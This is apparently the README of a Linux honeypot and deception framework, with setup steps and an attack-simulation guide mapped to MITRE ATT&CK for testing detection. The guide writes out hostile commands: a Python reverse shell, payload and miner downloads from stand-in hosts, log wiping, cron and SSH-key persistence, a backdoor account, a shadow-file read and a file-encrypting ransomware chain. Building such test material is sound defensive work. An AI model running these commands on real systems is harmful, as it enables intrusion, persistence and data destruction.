# AADE — Autonomous Adaptive Deception Environment

This next-generation adaptive honeypot system relies heavily on features exclusive to Linux environments, primarily KVM virtualisation, Linux AF_VSOCK (port 40) out-of-band communication, and iptables network manipulation.

All the backend code for the framework has been generated here. 

## Moving to Kali Linux (or any Linux Host)
Move this entire directory (`aade`) over to your Kali Linux host (either bare-metal or VMware with Nested Virtualisation enabled).

### 1. Execute the Master Installer
Run the master installation script to install all dependencies, download tools, and prepare firecracker and cowrie instances.
```bash
chmod +x master_install.sh
./master_install.sh
```

### 2. Generate the Gold Image (Phase 2)
Generate a rootfs filled with fake data that tricks the attacker into believing it's a real machine.
```bash
# Assuming you mounted an ext4 filesystem to /mnt/gold
sudo python3 generate_noise.py
```

### 3. Setup Honeywall (Phase 4)
This prevents malware and attacks launched inside the honeypot from escaping into the real network.
```bash
sudo chmod +x honeywall_setup.sh
sudo ./honeywall_setup.sh
```

### 4. Running the System
Once everything is downloaded and the gold image is built and sealed, you can launch the ecosystem in separate terminals:

**Terminal 1:** Start the vsock listener (Needs to run before Firecracker so the MicroVM can connect on boot)
```bash
python3 vsock_listener.py
```

**Terminal 2:** Start the C2 mitmproxy sinkhole
```bash
mitmproxy -p 8080 -s c2_sinkhole.py --ssl-insecure
```

**Terminal 3:** Launch the Cowrie honeypot (from `~/aade/cowrie` directory created by installer)
```bash
cd ~/aade/cowrie
bin/cowrie start
```

**Terminal 4:** Launch the Dashboard
```bash
python3 dashboard.py
# Dashboard will be available at http://localhost:5000
```

**Terminal 5:** Launch the Orchestrator
```bash
python3 orchestrator.py
```

- When the attacker connects to `Cowrie` and executes a suspicious command, the **Orchestrator** triggers the live-migration from Cowrie into an active Firecracker MicroVM.
- Any actions inside the MicroVM are piped out to the host via **AF_VSOCK**.
- The **Dashboard** actively polls the `.jsonl` logs to show you what's happening live using MITRE ATT&CK mappings.

## ⚔️ Attack Simulation Guide (Step-by-Step)

Use these commands inside your Cowrie terminal (`ssh root@localhost -p 2222`) to test the AADE detection capabilities.

### 1. System Reconnaissance (L1)
**Goal:** Attacker wants to know "Who am I and what is this machine?"
```bash
whoami; id; uname -a; cat /etc/os-release
```
- **TTP:** T1033 (User Discovery), T1082 (System Info Discovery)
- **Explanation:** Basic discovery used to profile the target.

### 2. Network Discovery (L1)
**Goal:** Map the internal network and open ports.
```bash
ip addr; netstat -antp; route -n
```
- **TTP:** T1016 (Network Configuration Discovery)
- **Explanation:** Essential for planning lateral movement.

### 3. Credential Access (L2)
**Goal:** Steal user identities or system passwords.
```bash
cat /etc/passwd; find / -name "*.history"
```
- **TTP:** T1003 (OS Credential Dumping)
- **Explanation:** Searching for configuration files or history logs that might contain cleartext secrets.

### 4. Malware Staging (L2)
**Goal:** Pull secondary tools from a remote server.
```bash
wget http://example.com/exploit.sh -O /tmp/exploit.sh; chmod +x /tmp/exploit.sh
```
- **TTP:** T1105 (Ingress Tool Transfer), T1222 (Permissions Modification)
- **Explanation:** Transferring payload files to the staging directory (`/tmp`).

### 5. Anti-Forensics (L3)
**Goal:** Hide tracks from the system administrator.
```bash
rm -rf /var/log/syslog; unset HISTFILE
```
- **TTP:** T1070 (Indicator Removal on Host)
- **Explanation:** Clearing log files and disabling bash history to prevent investigation.

### 6. Persistence via Cron (L3)
**Goal:** Ensure the malware restarts after a reboot.
```bash
(crontab -l ; echo "*/15 * * * * /tmp/exploit.sh") | crontab -
```
- **TTP:** T1053.003 (Scheduled Task: Cron)
- **Explanation:** Hooking into the system scheduler for periodic execution.

### 7. Account Backdoor (L4)
**Goal:** Create a high-privilege user for permanent access.
```bash
useradd -m -s /bin/bash sys_backup; echo "sys_backup:P@ssword123" | chpasswd
```
- **TTP:** T1136.001 (Create Local Account)
- **Explanation:** Creating a legitimate-looking user that persists across VM reboots.

### 8. Python Reverse Shell (L4)
**Goal:** Establish a direct interactive tunnel to the Attacker C2.
```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```
- **TTP:** T1059.006 (Python Interpretation), T1059.004 (Unix Shell)
- **Explanation:** A classic reverse shell that pipes the terminal back to the attacker's IP.

### 9. SQL Injection Probe (Web Exploit)
**Goal:** Test for injection vulnerabilities in a hypothetical back-end.
```bash
curl -X GET "http://localhost/app?id=1' OR '1'='1"
```
- **TTP:** T1190 (Exploit Public-Facing Application)
- **Explanation:** Probing for SQLi by injecting logical tautologies into URL parameters.

### 10. DDoS / Resource Exhaustion
**Goal:** Take down a service by overwhelming it with requests.
```bash
timeout 60s ping -f 10.0.0.1
```
- **TTP:** T1499.002 (Endpoint Denial of Service: Service Exhaustion)
- **Explanation:** Using a flood (`ping -f`) to saturate the network or CPU of a target.

### 11. Cryptojacking (Resource Hijacking)
**Goal:** Use the honeypot's CPU to mine cryptocurrency.
```bash
curl -LO http://miner.pool/xmrig; ./xmrig -o pool.supportxmr.com:443 -u 4...
```
- **TTP:** T1496 (Resource Hijacking)
- **Explanation:** Downloading and running a miner to monetize the compromise.

## 🚀 Advanced Attack Chains (The "Showcase" Collection)

Use these logical sequences to demonstrate how the **AADE Dashboard** tracks an evolving intrusion.

### Chain A: The "Ransomware Specialist"
1. **Recon:** `ls -R /home`
2. **Exfil Prep:** `tar -cvf backup.tar /home/phil/documents`
3. **Encryption (Impact):** `gpg --symmetric --cipher-algo AES256 backup.tar`
4. **Cleanup:** `rm backup.tar; rm -rf /home/phil/documents`
- **Dashboard Effect:** Triggers T1486 (Data Encrypted for Impact) and multi-vector tags on the same IP profile.

### Chain B: The "Crypto-Miner"
1. **Persistence:** `nohup wget http://miner.pool/linux_miner -O /tmp/miner && chmod +x /tmp/miner && ./tmp/miner &`
2. **Hide Info:** `rm /tmp/miner` (after execution starts)
- **Dashboard Effect:** Triggers T1496 (Resource Hijacking) and shows the "GHOST_REPLY" if the LLM simulates a successful background process.

### Chain C: "Defacing & Evasion"
1. **Defense Evasion:** `unset HISTFILE; export HISTSIZE=0`
2. **Persistence:** `echo "ssh-rsa AAAAB3N..." >> /root/.ssh/authorized_keys`
3. **Impact (Deface):** `echo "HACKED BY AADE" > /etc/motd`
- **Dashboard Effect:** Triggers Account Manipulation and Indicator Removal.

## 🧠 Triggering "Adaptive Deception" (MicroVM Shift)

The **Adaptive Plane** shifts to a real Firecracker MicroVM when it detects a command that is too complex for the Low-Interaction shell to handle safely.

**To trigger the shift, run:**
```bash
# Anything involving complex piping or specialized binaries
cat /etc/shadow | grep root | awk -F: '{print $1}'
```
- **Dashboard Effect:** You will see the **"MicroVM Active"** indicator turn Green and the **Mode** switch to **ADAPTIVE (High Interaction)**.
